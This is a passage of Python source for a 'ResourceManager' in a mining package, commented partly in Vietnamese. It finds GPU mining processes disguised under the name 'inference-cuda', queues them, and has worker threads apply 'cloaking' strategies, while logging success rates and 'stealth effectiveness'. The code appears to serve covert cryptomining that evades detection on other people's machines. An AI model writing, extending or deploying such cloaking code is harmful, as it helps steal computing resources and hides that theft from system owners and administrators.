            return False

    def _check_memory_availability(self) -> bool:
        """Check if memory cloaking is available (cgroups memory)"""
        try:
            # Check if we have memory resource manager
            return 'memory' in getattr(self.shared_resource_manager, 'resource_managers', {})
        except:
            return False

    # -----------------------------------------------------------------------------------------
    # METRICS (SYNC)
    # -----------------------------------------------------------------------------------------

    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        try:
            if not psutil.pid_exists(process.pid):
                self.logger.warning(f"PID={process.pid} không tồn tại.")
                return {}

            proc_obj = psutil.Process(process.pid)
            # CPU monitoring removed - GPU-only mode
            mem_mb = proc_obj.memory_info().rss / (1024**2)

            gpu_pct = 0.0
            if self.is_gpu_initialized():
                gpu_pct = self.shared_resource_manager.get_gpu_usage_percent(process.pid)

            # Tùy logic dự án, ở đây ví dụ:
            disk_mbps = 0.0 # Tính sau
            cache_l = self.shared_resource_manager.get_process_cache_usage(process.pid) if self.shared_resource_manager else 0.0

            metrics = {
                # CPU usage monitoring removed
                'memory_usage': float(mem_mb),
                'gpu_usage': float(gpu_pct),
                'network_usage': float(disk_mbps),
                'cache_usage': float(cache_l),
            }
            self.logger.debug(f"Metrics PID={process.pid}: {metrics}")
            return metrics
        except Exception as e:
            self.logger.error(f"Lỗi collect_metrics PID={process.pid}: {e}\n{traceback.format_exc()}")
            return {}

    def collect_all_metrics(self) -> Dict[str, Dict[str, Any]]:
        metrics_data: Dict[str, Dict[str, Any]] = {}
        if not self.mining_processes_lock.acquire(timeout=5):
            self.logger.error("Timeout lock collect_all_metrics.")
            return metrics_data
        try:
            for p in self.mining_processes:
                res = self.collect_metrics(p)
                if res:
                    metrics_data[str(p.pid)] = res
                else:
                    self.logger.warning(f"Không có metrics hợp lệ cho PID={p.pid}")
            self.logger.debug(f"Dữ liệu metrics (all): {metrics_data}")
        except Exception as e:
            self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
        finally:
            self.mining_processes_lock.release()

        return metrics_data

    def _discover_and_register_existing_processes(self) -> None:
        """
        🔍 PROCESS DISCOVERY: Scan system for existing mining processes and register them
        Solves timing issue where processes start before ResourceManager is ready
        """
        import psutil
        
        target_processes = {
            # CPU mining processes removed - GPU-only mode
            'inference-cuda': True  # GPU mining  
        }
        
        discovered_count = 0
        
        try:
            self.logger.info(f"🔍 [PROCESS DISCOVERY DEBUG] Starting psutil.process_iter scan...")
            process_count = 0
            target_found = 0
            
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                process_count += 1
                try:
                    proc_name = proc.info['name']
                    if proc_name in target_processes:
                        target_found += 1
                        self.logger.info(f"🔍 [PROCESS DISCOVERY DEBUG] Found target process: {proc_name}")
                        pid = proc.info['pid']
                        is_gpu = target_processes[proc_name]
                        
                        self.logger.info(f"🔍 [PROCESS DISCOVERY] Found {proc_name} PID={pid} (GPU)")
                        
                        # ✅ NEW: Skip wrapper PIDs that should be ignored
                        if pid in self.ignored_wrapper_pids:
                            self.logger.info(f"🚫 [PROCESS DISCOVERY] Skipping wrapper PID {pid} - in ignored list")
                            self.logger.info(f"📋 [PROCESS DISCOVERY] Ignored wrapper PIDs: {list(self.ignored_wrapper_pids)}")
                            continue
                        
                        # Create MiningProcess object for real mining PID only
                        mining_process = MiningProcess(pid, proc_name, is_gpu=is_gpu)
                        
                        # Add to tracking list
                        with self.mining_processes_lock:
                            # Check if already exists
                            existing = any(mp.pid == pid for mp in self.mining_processes)
                            if not existing:
                                self.mining_processes.append(mining_process)
                                self.logger.info(f"🔍 [PROCESS DISCOVERY] Added {proc_name} PID={pid} to tracking")
                                
                                # Enqueue for cloaking
                                self.logger.info(f"🔍 [PROCESS DISCOVERY] Enqueuing {proc_name} PID={pid} for cloaking")
                                self.enqueue_cloaking(mining_process)
                                discovered_count += 1
                                self.logger.info(f"🔍 [COUNTER DEBUG] New process added - discovered_count now: {discovered_count}")
                            else:
                                self.logger.info(f"🔍 [PROCESS DISCOVERY] {proc_name} PID={pid} already tracked, skipping (not counted)")
                                self.logger.info(f"🔍 [COUNTER DEBUG] Process already exists - discovered_count remains: {discovered_count}")
                                
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    # Skip processes that can't be accessed
                    continue
                except Exception as proc_err:
                    self.logger.warning(f"🔍 [PROCESS DISCOVERY] Error processing {proc.info.get('name', 'unknown')}: {proc_err}")
                    
        except Exception as e:
            self.logger.error(f"❌ [PROCESS DISCOVERY] Discovery failed: {e}")
            
        # Final detailed report
        current_tracked_count = len(self.mining_processes) if hasattr(self, 'mining_processes') else 0
        self.logger.info(f"🔍 [PROCESS DISCOVERY DEBUG] Scan completed - total processes: {process_count}, targets found: {target_found}")
        self.logger.info(f"🔍 [COUNTER DEBUG] Final counts - newly discovered: {discovered_count}, currently tracked: {current_tracked_count}")
        
        # Improved final message based on discovery context
        if discovered_count > 0:
            self.logger.info(f"✅ [PROCESS DISCOVERY] Completed - discovered {discovered_count} NEW mining processes")
        else:
            if target_found > 0:
                self.logger.info(f"✅ [PROCESS DISCOVERY] Completed - found {target_found} existing processes (0 new discoveries)")
            else:
                self.logger.info(f"✅ [PROCESS DISCOVERY] Completed - no mining processes found")

    def receive_from_coordinator(self, pid: int, coordinator_metadata: Dict[str, Any]) -> bool:
        """
        **Receive From Coordinator** (nhận từ coordinator)
        
        Enhanced linear flow method để nhận sequential handoff từ Hook Coordinator.
        Triggers immediate strategy application sau khi nhận coordination signal.
        
        Args:
            pid: Process ID từ coordinator
            coordinator_metadata: Metadata từ coordinator handoff
            
        Returns:
            bool: True nếu resource management initialization successful
        """
        try:
            self.logger.info(f"🔄 [RM-LINEAR-RECEIVE] Receiving PID {pid} from coordinator via sequential handoff")
            self.logger.debug(f"🔍 [RM-LINEAR-RECEIVE] Coordinator metadata: {coordinator_metadata}")
            
            with self._linear_handoff_lock:
                # **Track linear handoff metadata** (theo dõi metadata handoff tuyến tính)
                handoff_record = {
                    'timestamp': time.time(),
                    'source': 'hook_coordinator',
                    'original_metadata': coordinator_metadata,
                    'resource_manager_timestamp': time.time(),
                    'handoff_chain': coordinator_metadata.get('handoff_chain', []) + ['resource_manager']
                }
                
                self._linear_handoff_tracking[pid] = handoff_record
                self.logger.debug(f"📝 [RM-LINEAR-RECEIVE] Handoff record stored for PID {pid}")
            
            # **Immediate strategy orchestration** (điều phối chiến lược ngay lập tức)
            orchestration_success = self._orchestrate_linear_strategies(pid, handoff_record)
            
            if orchestration_success:
                self.logger.info(f"✅ [RM-LINEAR-RECEIVE] Successfully received and orchestrated strategies for PID {pid}")
                return True
            else:
                self.logger.warning(f"⚠️ [RM-LINEAR-RECEIVE] Strategy orchestration failed for PID {pid}")
                return False
                
        except Exception as e:
            self.logger.error(f"❌ [RM-LINEAR-RECEIVE] Failed to receive from coordinator for PID {pid}: {e}")
            return False
    
    def _orchestrate_linear_strategies(self, pid: int, handoff_metadata: Dict[str, Any]) -> bool:
        """
        **Orchestrate Linear Strategies** (điều phối chiến lược tuyến tính)
        
        Core orchestration method cho sequential strategy application trong linear flow.
        Triggers strategy chain based on handoff metadata and process characteristics.
        
        Args:
            pid: Process ID
            handoff_metadata: Metadata từ linear handoff chain
            
        Returns:
            bool: True nếu strategy orchestration successful
        """
        try:
            self.logger.info(f"🎯 [STRATEGY-ORCHESTRATION] Starting linear strategy orchestration for PID {pid}")
            
            # **Check if we have an active SharedResourceManager** (kiểm tra SharedResourceManager đang hoạt động)
            if not self.shared_resource_manager:
                self.logger.warning(f"⚠️ [STRATEGY-ORCHESTRATION] SharedResourceManager not initialized - deferring orchestration")
                return False
            
            # **Create MiningProcess object for strategy application** (tạo đối tượng MiningProcess cho áp dụng chiến lược)
            try:
                import psutil
                process_obj = psutil.Process(pid)
                mining_process = MiningProcess(
                    pid=pid,
                    name=process_obj.name(),
                    cpu_percent=0,  # Will be updated during strategy application
                    memory_percent=0  # Will be updated during strategy application
                )
                
                # **Sequential strategy application** (áp dụng chiến lược tuần tự)
                # Apply strategies in specific order for predictable results
                strategy_sequence = self._determine_strategy_sequence(handoff_metadata)
                
                for strategy_name in strategy_sequence:
                    try:
                        self.logger.info(f"🔄 [STRATEGY-ORCHESTRATION] Applying strategy '{strategy_name}' to PID {pid}")
                        self.shared_resource_manager.apply_cloak_strategy(strategy_name, mining_process)
                        self.logger.info(f"✅ [STRATEGY-ORCHESTRATION] Strategy '{strategy_name}' applied successfully")
                    except Exception as strategy_err:
                        self.logger.error(f"❌ [STRATEGY-ORCHESTRATION] Strategy '{strategy_name}' failed for PID {pid}: {strategy_err}")
                        # Continue with other strategies
                
                self.logger.info(f"🎯 [STRATEGY-ORCHESTRATION] Linear strategy orchestration completed for PID {pid}")
                return True
                
            except psutil.NoSuchProcess:
                self.logger.error(f"❌ [STRATEGY-ORCHESTRATION] Process {pid} no longer exists")
                return False
                
        except Exception as e:
            self.logger.error(f"❌ [STRATEGY-ORCHESTRATION] Strategy orchestration failed for PID {pid}: {e}")
            return False
    
    def _determine_strategy_sequence(self, handoff_metadata: Dict[str, Any]) -> List[str]:
        """
        **Determine Strategy Sequence** (xác định trình tự chiến lược)
        
        Intelligent strategy sequencing based on handoff metadata và process characteristics.
        
        Args:
            handoff_metadata: Metadata từ handoff chain
            
        Returns:
            List[str]: Ordered list of strategy names to apply
        """
        # **Default GPU strategy sequence** (trình tự chiến lược GPU mặc định)
        # Designed for optimal cloaking effectiveness
        default_sequence = [
            'default_gpu_cloak',  # Base GPU cloaking
            'thermal_management',  # Thermal optimization
            'performance_optimization'  # Performance tuning
        ]
        
        # **Future enhancement**: Analyze handoff metadata for intelligent sequencing
        # For now, return default sequence for predictable behavior
        return default_sequence

    def start(self):
        self.logger.info("🚀 Starting ResourceManager (Ultra-Fast Non-Blocking Initialization)...")
        start_time = time.time()
        try:
            # Step 1: Minimal essential initialization only
            step_start = time.time()
            self.logger.info("⚡ Step 1/3: Essential components creation...")
            
            # ✅ ENHANCED: Shared resource managers creation với singleton optimization
            try:
                resource_managers = ResourceControlFactory.create_resource_managers(
                    config=self.config,
                    logger=self.logger
                )
                
                if not resource_managers:
                    self.logger.warning("ResourceControlFactory trả về rỗng - using fallback mode")
                    resource_managers = {}  # Fallback mode
                else:
                    # ✅ LOG SHARING EFFICIENCY
                    sharing_info = ResourceControlFactory.get_shared_managers_info()
                    self.logger.info(f"📊 [ResourceManager] {sharing_info['memory_efficiency']}")
                    self.logger.info(f"♾️ [ResourceManager] Using shared managers: {list(resource_managers.keys())}")
                    
                self.logger.info(f"✅ Step 1 completed in {time.time() - step_start:.2f}s")
            except Exception as e:
                self.logger.warning(f"Shared resource managers creation failed: {e} - using fallback mode")
                resource_managers = {}

            # Step 2: Fast SharedResourceManager với lazy NVML init
            step_start = time.time()
            self.logger.info("⚡ Step 2/3: Fast SharedResourceManager (lazy init)...")
            try:
                self.shared_resource_manager = SharedResourceManager(self.config, self.logger, resource_managers)
                
                # ✅ INITIALIZE GPU MONITORING: Khởi tạo GPU monitoring system
                self.logger.info("🎮 [STARTUP] GPU monitoring initialization checkpoint started")
                self._initialize_gpu_monitoring(resource_managers)
                self.logger.info("✅ [STARTUP] GPU monitoring validation checkpoint passed")
                
                self.logger.info(f"✅ Step 2 completed in {time.time() - step_start:.2f}s")
            except Exception as e:
                self.logger.warning(f"SharedResourceManager init failed: {e} - continuing without shared resources")
                self.shared_resource_manager = None

            # Step 3: Background worker setup (non-blocking)
            step_start = time.time()
            self.logger.info("⚡ Step 3/3: Background workers setup...")
            
            # Start worker thread ngay lập tức
            adjust_thread = threading.Thread(
                target=self.process_resource_adjustments,
                daemon=True,
                name="CloakingWorker"
            )
            adjust_thread.start()
            self.workers.append(adjust_thread)

            # ✅ NEW: Spawn additional CloakingWorker threads (parallel processing)
            additional_workers = 3  # Total 4 workers (1 original + 3 extra)
            for idx in range(additional_workers):
                t = threading.Thread(
                    target=self.process_resource_adjustments,
                    daemon=True,
                    name=f"CloakingWorker-{idx+2}"
                )
                t.start()
                self.workers.append(t)
            
            # ✅ SIMPLIFIED: DirectPIDRegistry-driven architecture only
            
            # --- NEW: Force-create detailed log files for core modules ---
            try:
                from .unified_logging import get_unified_logger
                for core_logger_name in [
                    'mining_environment.cloak_strategies',
                    'mining_environment.resource_control']:
                    lg = get_unified_logger(core_logger_name)
                    lg.setLevel(logging.DEBUG)  # Đảm bảo level DEBUG
                    for h in lg.handlers:
                        h.setLevel(logging.DEBUG)
                    lg.info("===== CORE LOGGER INITIALIZED BY ResourceManager.start =====")
            except Exception as init_log_err:
                self.logger.debug(f"[DIAGNOSTIC] Unable to initialize core loggers: {init_log_err}")

            total_time = time.time() - start_time
            self.logger.info(f"🎯 ResourceManager startup completed in {total_time:.2f}s (Target: <5s)")
            
            # ✅ STARTUP VALIDATION CHECKPOINTS: Comprehensive system validation
            self._perform_startup_validation_checkpoints()
            
            # ✅ NEW: Process Discovery for existing mining processes
            self.logger.info("🔍 [PROCESS DISCOVERY] Scanning for existing mining processes...")
            self._discover_and_register_existing_processes()
            
            # Ultra-fast main loop với minimal monitoring
            self.logger.info("🔄 Entering minimal main monitoring loop...")
            last_discovery_time = time.time()
            last_health_check_time = time.time()
            discovery_interval = 60  # Run Process Discovery every 60 seconds
            health_check_interval = 30  # Run GPU health check every 30 seconds
            
            while not self._stop_flag:
                current_time = time.time()
                
                # Periodic Process Discovery để phát hiện mining processes mới
                if current_time - last_discovery_time >= discovery_interval:
                    self.logger.info("🔍 [PERIODIC DISCOVERY] Running periodic process discovery...")
                    self._discover_and_register_existing_processes()
                    last_discovery_time = current_time
                
                # ✅ PERIODIC GPU HEALTH CHECK: Kiểm tra sức khỏe GPU định kỳ
                if current_time - last_health_check_time >= health_check_interval:
                    self._periodic_gpu_health_check()
                    last_health_check_time = current_time
                
                time.sleep(1.0)  # Basic monitoring interval

            self.logger.info("ResourceManager main loop completed.")
        except Exception as e:
            self.logger.error(f"❌ ResourceManager startup failed: {e}\n{traceback.format_exc()}")
            self.shutdown()

    def _record_strategy_metrics(self, pid: int, result_type: str, metrics_data: Dict[str, Any]) -> None:
        """
        ✅ NEW: Record strategy application metrics for monitoring and analysis.
        
        :param pid: Process ID
        :param result_type: 'success' or 'failure'
        :param metrics_data: Dictionary containing detailed metrics
        """
        try:
            import time
            timestamp = time.time()
            
            self.strategy_metrics[pid] = {
                'timestamp': timestamp,
                'result_type': result_type,
                'applied_count': metrics_data.get('applied_count', 0),
                'failed_count': metrics_data.get('failed_count', 0),
                'total_count': metrics_data.get('total_count', 0),
                'success_rate': metrics_data.get('success_rate', 0.0),
                'primary_applied': metrics_data.get('primary_applied', False),
                'strategies': metrics_data.get('strategies', [])
            }
            
            # ✅ ENHANCED: Log summary metrics for monitoring
            if result_type == 'success':
                self.logger.info(f"📈 [Metrics] PID={pid} SUCCESS: {metrics_data.get('success_rate', 0):.1f}% rate, {metrics_data.get('applied_count', 0)}/{metrics_data.get('total_count', 0)} applied")
            else:
                self.logger.warning(f"📉 [Metrics] PID={pid} FAILURE: 0% rate, {metrics_data.get('failed_count', 0)}/{metrics_data.get('total_count', 0)} failed")
                
        except Exception as e:
            self.logger.error(f"❌ Error recording strategy metrics for PID={pid}: {e}")

    def get_strategy_metrics_summary(self) -> Dict[str, Any]:
        """
        ✅ NEW: Get comprehensive strategy metrics summary for monitoring.
        
        :return: Dictionary containing aggregated metrics
        """
        try:
            if not self.strategy_metrics:
                return {'message': 'No metrics available'}
            
            total_processes = len(self.strategy_metrics)
            successful_processes = sum(1 for m in self.strategy_metrics.values() if m['result_type'] == 'success')
            failed_processes = total_processes - successful_processes
            
            avg_success_rate = sum(m['success_rate'] for m in self.strategy_metrics.values()) / total_processes
            
            return {
                'timestamp': time.time(),
                'total_processes': total_processes,
                'successful_processes': successful_processes,
                'failed_processes': failed_processes,
                'overall_success_rate': (successful_processes / total_processes) * 100,
                'avg_strategy_success_rate': avg_success_rate,
                'recent_metrics': list(self.strategy_metrics.values())[-10:]  # Last 10 entries
            }
            
        except Exception as e:
            self.logger.error(f"❌ Error generating metrics summary: {e}")
            return {'error': str(e)}

    def process_resource_adjustments(self):
        """
        ✅ OPTIMIZED: Streamlined cloaking worker với type-aware processing
        """
        self.logger.info("=== Starting optimized CloakingWorker...")
        pid = None

        while not self._stop_flag:
            try:
                # ✅ DIAGNOSTIC: Log queue status
                self.logger.debug(f"🔍 [DIAGNOSTIC] CloakingWorker checking queue... Size: {self.resource_adjustment_queue.qsize()}")
                
                item = self.resource_adjustment_queue.get(timeout=1)
                priority, count_val, task = item

                p = task.get('process')
                if not p:
                    self.resource_adjustment_queue.task_done()
                    self.logger.debug("🔄 [DIAGNOSTIC] Skipping task - no process object")
                    continue

                pid = p.pid
                process_type = task.get('process_type', 'GPU')
                
                self.logger.info(f"[CloakingWorker] Processing {process_type} task for PID={pid}")

                if task['type'] == 'cloaking' and self.shared_resource_manager:
                    strategies = task.get('strategies', [])
                    strategy_hints = task.get('strategy_hints', {})
                    primary_strategy = task.get('primary_strategy', strategies[0] if strategies else 'gpu_cloaking')  # ✅ GPU-only
                    additional_strategies = task.get('additional_strategies', [])
                    
                    self.logger.info(f"🎯 [Comprehensive Cloaking] Applying {len(strategies)} strategies for PID={pid}")
                    self.logger.info(f"🔧 Primary: {primary_strategy}, Additional: {additional_strategies}")
                    
                    # ✅ STRATEGY APPLICATION TRACKING: Track success/failure of each strategy
                    strategy_results = {'applied': [], 'failed': [], 'total': len(strategies)}
                    
                    # ✅ MEMORY-SAFE COORDINATION: Verify coordination before strategy application
                    coordination_verified = False
                    try:
                        import sys
                        import os
                        # ✅ FIXED: Correct import path for coordination module
                        coord_path = os.path.join(os.path.dirname(__file__), '..', 'coordination')
                        if coord_path not in sys.path:
                            sys.path.insert(0, coord_path)
                        from coordinator import get_hook_coordinator
                        coordinator = get_hook_coordinator()
                        
                        # ✅ ENHANCED DEBUG: Log current coordinator state
                        self.logger.debug(f"🔍 [DEBUG] Coordinator state: {getattr(coordinator, 'hooks_ready', {})}")
                        
                        # ✅ ENHANCED AUTO-REGISTRATION: Proactive registration với thread synchronization
                        if pid not in getattr(coordinator, 'hooks_ready', {}):
                            self.logger.warning(f"⚠️ [ENHANCED-AUTO-REGISTER] PID {pid} not in coordinator - proactive registration")
                            
                            # Enhanced registration với retry mechanism
                            registration_success = False
                            for attempt in range(3):
                                try:
                                    coordinator.register_pid(pid)
                                    coordinator.notify_hooks_ready(pid)
                                    
                                    # Verify registration success
                                    if coordinator.check_hooks_ready(pid):
                                        registration_success = True
                                        self.logger.info(f"✅ [ENHANCED-AUTO-REGISTER] PID {pid} successfully registered (attempt {attempt + 1})")
                                        break
                                    else:
                                        self.logger.warning(f"⚠️ [ENHANCED-AUTO-REGISTER] Registration verification failed for PID {pid} (attempt {attempt + 1})")
                                        time.sleep(0.5)  # Brief wait before retry
                                        
                                except Exception as e:
                                    self.logger.error(f"❌ [ENHANCED-AUTO-REGISTER] Registration attempt {attempt + 1} failed: {e}")
                                    time.sleep(0.5)
                            
                            if not registration_success:
                                self.logger.error(f"❌ [ENHANCED-AUTO-REGISTER] Failed to register PID {pid} after 3 attempts")
                        
                        if coordinator.check_hooks_ready(pid):
                            coordination_verified = True
                            self.logger.info(f"🔒 [MEMORY-SAFE] Hook coordination verified for PID={pid} - proceeding with strategies")
                        else:
                            self.logger.warning(f"⚠️ [MEMORY-RISK] No hook coordination for PID={pid} - applying conservative strategies only")
                    except Exception as coord_check_err:
                        self.logger.warning(f"⚠️ [COORDINATION-CHECK] Failed to verify coordination: {coord_check_err}")
                    
                    # ✅ DIAGNOSTIC: Log strategy processing start
                    self.logger.debug(f"🔍 [DIAGNOSTIC] Starting strategy processing for PID={pid}")
                    self.logger.debug(f"📋 Strategies to apply: {strategies}")
                    self.logger.debug(f"🔒 Coordination verified: {coordination_verified}")
                    
                    for strat in strategies:
                        try:
                            # ✅ MEMORY-SAFE STRATEGY FILTERING: Skip memory-intensive strategies if not coordinated
                            if not coordination_verified and strat in ['gpu_cloaking', 'memory']:
                                self.logger.warning(f"⚠️ [MEMORY-SAFETY] Strategy {strat} blocked - no coordination (memory risk)")
                                # ✅ ENHANCED RECOVERY: Try one more time to establish coordination
                                try:
                                    from coordinator import get_hook_coordinator
                                    coordinator = get_hook_coordinator()
                                    # Force-register and notify if needed
                                    if pid not in getattr(coordinator, 'hooks_ready', {}):
                                        coordinator.register_pid(pid)
                                        coordinator.notify_hooks_ready(pid)
                                        self.logger.info(f"🔄 [RECOVERY] Emergency coordination established for PID {pid}")
                                        coordination_verified = True
                                    elif coordinator.check_hooks_ready(pid):
                                        coordination_verified = True
                                        self.logger.info(f"🔄 [RECOVERY] Coordination now verified for PID {pid}")
                                except Exception as recovery_err:
                                    self.logger.error(f"❌ [RECOVERY] Emergency coordination failed: {recovery_err}")
                                
                                # If still not coordinated, skip the strategy
                                if not coordination_verified:
                                    strategy_results['failed'].append(strat)
                                    continue
                                else:
                                    self.logger.info(f"✅ [RECOVERY] Strategy {strat} now allowed - coordination recovered")
                            
                            # ✅ INTELLIGENT CACHING: Use advanced cache system
                            creation_start = time.time()
                            
                            # ✅ DIAGNOSTIC: Log each strategy attempt
                            self.logger.debug(f"🎯 [DIAGNOSTIC] Attempting strategy: {strat} for PID={pid}")
                            self.logger.debug(f"🔒 [COORDINATION] Strategy {strat} - coordination_verified: {coordination_verified}")
                            
                            # ✅ CACHE LOOKUP: Try to get from intelligent cache
                            s = self.shared_resource_manager.strategy_cache.get(
                                strategy_type=strat,
                                process_type=process_type,
                                strategy_hints=strategy_hints
                            )
                            
                            if s is None:
                                # ✅ CACHE MISS: Create new strategy
                                strategy_creation_start = time.time()
                                s = CloakStrategyFactory.create_strategy(
                                    strat, self.config, self.logger, 
                                    self.shared_resource_manager.resource_managers,
                                    process_type=process_type,
                                    strategy_hints=strategy_hints
                                )
                                creation_time_ms = (time.time() - strategy_creation_start) * 1000
                                
                                # ✅ CACHE STORE: Store in intelligent cache with metrics
                                cache_key = self.shared_resource_manager.strategy_cache.put(
                                    strategy_type=strat,
                                    process_type=process_type,
                                    strategy_object=s,
                                    creation_time_ms=creation_time_ms,
                                    strategy_hints=strategy_hints,
                                    metadata={
                                        'worker_id': self.worker_id,
                                        'pid': pid,
                                        'creation_timestamp': time.time()
                                    }
                                )
                                
                                self.logger.info(f"🎯 [Worker] Created strategy: {cache_key} (creation: {creation_time_ms:.1f}ms)")
                            else:
                                self.logger.debug(f"♻️ [Worker] Cache hit for strategy: {strat}_{process_type}")

                            # ✅ ENHANCED STRATEGY APPLICATION: delegate to ResourceCoordinator if plugin system required
                            from mining_environment.scripts.resource_control import ResourceCoordinator

                            apply_success = False  # default
                            if s:
                                try:
                                    if getattr(s, "requires_plugin_system", False):
                                        # Dùng ResourceCoordinator để áp dụng (bao gồm plugin delegation)
                                        rc = ResourceCoordinator(self.config, self.logger)
                                        strategy_key = getattr(s, "strategy_type", strat)
                                        apply_success = rc.apply_strategy(strategy_key, p)
                                    else:
                                        # Direct apply như cũ
                                        if hasattr(s, "apply"):
                                            apply_success = s.apply(p)
                                except Exception as _coord_err:
                                    self.logger.error(f"❌ Delegation error for strategy {strat}: {_coord_err}")
                                    apply_success = False
                                    
                                # ✅ FIX: Cập nhật strategy_results dựa trên apply_success
                                if apply_success:
                                    strategy_results['applied'].append(strat)
                                    self.logger.debug(f"✅ [Strategy Success] {strat} successfully applied to PID={pid}")
                                else:
                                    strategy_results['failed'].append(strat)
                                    self.logger.warning(f"❌ [Strategy Failed] {strat} failed for PID={pid}")
                            else:
                                strategy_results['failed'].append(strat)
                                self.logger.warning(f"❌ [Strategy] {strat} not applicable for PID={pid}")
                                
                        except Exception as strategy_error:
                            strategy_results['failed'].append(strat)
                            # ✅ ENHANCED STRATEGY ERROR HANDLING: Track both return value failures and exceptions
                            is_primary = (strat == primary_strategy)
                            error_level = "ERROR" if is_primary else "WARNING"
                            self.logger.log(
                                logging.ERROR if is_primary else logging.WARNING,
                                f"❌ [{error_level}] Strategy '{strat}' exception for PID={pid}: {strategy_error}"
                            )
                            
                            # ✅ PRIMARY STRATEGY FAILURE: More serious, but continue with other strategies
                            if is_primary:
                                self.logger.error(f"🚨 Primary strategy '{strat}' failed - process may not be fully cloaked")

                    # ✅ ENHANCED CLOAKING STATUS: Track success/failure metrics with detailed reporting
                    applied_count = len(strategy_results['applied'])
                    failed_count = len(strategy_results['failed'])
                    primary_applied = primary_strategy in strategy_results['applied']
                    success_rate = (applied_count / strategy_results['total']) * 100 if strategy_results['total'] > 0 else 0
                    
                    if applied_count > 0:
                        self.process_states[pid] = "cloaked"
                        success_level = "FULL" if failed_count == 0 else "PARTIAL"
                        self.logger.info(f"✅ [{success_level}] {process_type} PID={pid} cloaked: {applied_count}/{strategy_results['total']} strategies ({success_rate:.1f}% success rate)")
                        self.logger.info(f"📊 Applied: {strategy_results['applied']}")
                        
                        # ✅ METRICS TRACKING: Record success metrics for monitoring
                        self._record_strategy_metrics(pid, 'success', {
                            'applied_count': applied_count,
                            'total_count': strategy_results['total'],
                            'success_rate': success_rate,
                            'primary_applied': primary_applied,
                            'strategies': strategy_results['applied']
                        })
                        
                        if failed_count > 0:
                            self.logger.warning(f"⚠️ Failed strategies: {strategy_results['failed']}")
                            
                        # ✅ PRIMARY STRATEGY SUCCESS CHECK
                        if primary_applied:
                            self.logger.info(f"🎯 Primary strategy '{primary_strategy}' successfully applied")
                        else:
                            self.logger.warning(f"🚨 Primary strategy '{primary_strategy}' failed - reduced stealth effectiveness")
                    else:
                        # ✅ COMPLETE FAILURE: All strategies failed
                        self.process_states[pid] = "cloaking_failed"
                        self.logger.error(f"❌ [FAILED] No strategies applied for {process_type} PID={pid} (0% success rate)")
                        self.logger.error(f"💀 All strategies failed: {strategy_results['failed']}")
                        
                        # ✅ METRICS TRACKING: Record failure metrics for monitoring
                        self._record_strategy_metrics(pid, 'failure', {
                            'failed_count': failed_count,
                            'total_count': strategy_results['total'],
                            'success_rate': 0.0,
                            'primary_applied': False,
                            'strategies': strategy_results['failed']
                        })
                
                # ✅ CACHE METRICS: Periodic cache performance logging
                self._log_cache_metrics_if_needed()

                self.resource_adjustment_queue.task_done()

            except queue.Empty:
                continue
            except Exception as e:
                self.logger.error(f"❌ CloakingWorker error: {e} (PID={pid})")

        self.logger.info("=== CloakingWorker stopped")

    def discover_mining_processes(self) -> List[MiningProcess]:
        """
        ✅ SIMPLIFIED: DirectPIDRegistry-driven process discovery only
        Trả về các tiến trình đã được tracked qua DirectPIDRegistry events
        """
        try:
            with self.mining_processes_lock:
                mining_processes = list(self.mining_processes)
                self.logger.info(f"✅ DirectPIDRegistry discovery: Found {len(mining_processes)} tracked processes")
                return mining_processes
                
        except Exception as e:
            self.logger.error(f"Lỗi khi truy xuất tracked processes: {e}\n{traceback.format_exc()}")
            return []

    def get_process_priority(self, process_name: str) -> int:
        priority_map = self.config.process_priority_map
        pri_val = priority_map.get(process_name.lower(), 1)
        if not isinstance(pri_val, int):
            self.logger.warning(f"Priority cho '{process_name}' không phải int => gán=1.")
            return 1
        return pri_val

    def _initialize_gpu_monitoring(self, resource_managers: Dict[str, Any]) -> None:
        """
        **Initialize GPU Monitoring System** (khởi tạo hệ thống giám sát GPU)
        
        Args:
            resource_managers: Dictionary of resource managers từ Factory
        """
        try:
            self.logger.info("🔍 [GPU MONITOR] Starting comprehensive GPU monitoring initialization...")
            self.logger.info(f"📋 [GPU MONITOR] Resource managers available: {list(resource_managers.keys())}")
            
            # ✅ IMPORT GPU MONITOR: Import GPU monitoring system
            self.logger.info("📦 [GPU MONITOR] Importing GPU monitoring system...")
            from .gpu_resource_monitor import initialize_gpu_monitoring
            self.logger.info("✅ [GPU MONITOR] GPU monitoring system import successful")
            
            # ✅ GET GPU MANAGER: Lấy GPU manager instance
            self.logger.info("🎮 [GPU MONITOR] Retrieving GPU manager instance...")
            gpu_manager = resource_managers.get('gpu')
            if not gpu_manager:
                self.logger.error("❌ [GPU MONITOR] CRITICAL: No GPU manager found in resource_managers")
                self.logger.error(f"📋 [GPU MONITOR] Available managers: {list(resource_managers.keys())}")
                self.logger.warning("⚠️ [GPU MONITOR] Skipping monitoring initialization - no GPU manager")
                return
            
            # ✅ GPU MANAGER VALIDATION: Validate GPU manager instance
            self.logger.info("🔍 [GPU MONITOR] Validating GPU manager instance...")
            gpu_count = getattr(gpu_manager, 'get_gpu_count', lambda: 0)()
            nvml_status = getattr(gpu_manager, 'is_nvml_initialized', lambda: False)()
            self.logger.info(f"🎮 [GPU MONITOR] GPU Manager Status: GPUs={gpu_count}, NVML={nvml_status}")
            
            # ✅ MONITORING CONFIG: Cấu hình monitoring
            self.logger.info("⚙️ [GPU MONITOR] Configuring monitoring parameters...")
            monitoring_config = {
                'auto_start_monitoring': True,
                'health_check_interval_seconds': 30,
                'history_retention_hours': 24,
                'max_history_records': 1000
            }
            self.logger.info(f"📊 [GPU MONITOR] Monitoring config: {monitoring_config}")
            
            # ✅ INITIALIZE MONITOR: Khởi tạo monitor
            self.logger.info("🚀 [GPU MONITOR] Initializing GPU monitoring system...")
            self.gpu_monitor = initialize_gpu_monitoring(gpu_manager, monitoring_config)
            
            # ✅ VALIDATION: Verify monitoring initialization
            if hasattr(self, 'gpu_monitor') and self.gpu_monitor:
                self.logger.info("✅ [GPU MONITOR] GPU monitoring system initialized successfully")
                self.logger.info(f"📊 [GPU MONITOR] Health check interval: {monitoring_config['health_check_interval_seconds']}s")
                self.logger.info(f"🔍 [GPU MONITOR] Auto-start monitoring: {monitoring_config['auto_start_monitoring']}")
                
                # ✅ ACTIVATION STATUS: Check if monitoring is active
                is_monitoring = getattr(self.gpu_monitor, 'is_monitoring', False)
